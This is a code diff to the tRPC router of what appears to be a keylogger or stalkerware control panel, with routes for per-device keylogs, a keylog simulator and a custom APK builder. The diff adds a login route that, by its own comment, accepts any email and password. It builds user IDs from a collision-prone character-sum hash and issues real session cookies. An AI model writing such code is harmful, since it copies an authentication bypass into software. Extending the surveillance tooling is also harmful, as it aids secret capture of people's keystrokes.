@@ -11,12 +11,48 @@ import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
 import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs } from "./db";
 import { startKeylogSimulator } from "./keylogSimulator";
 import { buildCustomAPK } from "./apk-builder";
+import { sdk } from "./_core/sdk";
 
 export const appRouter = router({
     // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
   system: systemRouter,
   auth: router({
     me: publicProcedure.query(opts => opts.ctx.user),
+    login: publicProcedure
+      .input(z.object({
+        email: z.string().email(),
+        password: z.string().min(1),
+      }))
+      .mutation(async ({ input, ctx }) => {
+        // Simple authentication: accept any email/password combination
+        // Generate a numeric userId based on email hash
+        const emailHash = input.email.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
+        const userId = Math.abs(emailHash % 1000000); // Ensure it's a positive number
+        
+        try {
+          // Create a session token
+          const sessionToken = await sdk.createSessionToken(userId, input.email);
+          
+          // Set the session cookie
+          const cookieOptions = getSessionCookieOptions(ctx.req);
+          ctx.res.cookie(COOKIE_NAME, sessionToken, cookieOptions);
+          
+          return {
+            success: true,
+            user: {
+              id: userId,
+              email: input.email,
+              name: input.email.split('@')[0],
+            },
+          };
+        } catch (error) {
+          console.error('Login error:', error);
+          throw new TRPCError({
+            code: 'INTERNAL_SERVER_ERROR',
+            message: 'Erro ao fazer login',
+          });
+        }
+      }),
     logout: publicProcedure.mutation(({ ctx }) => {
       const cookieOptions = getSessionCookieOptions(ctx.req);
       ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
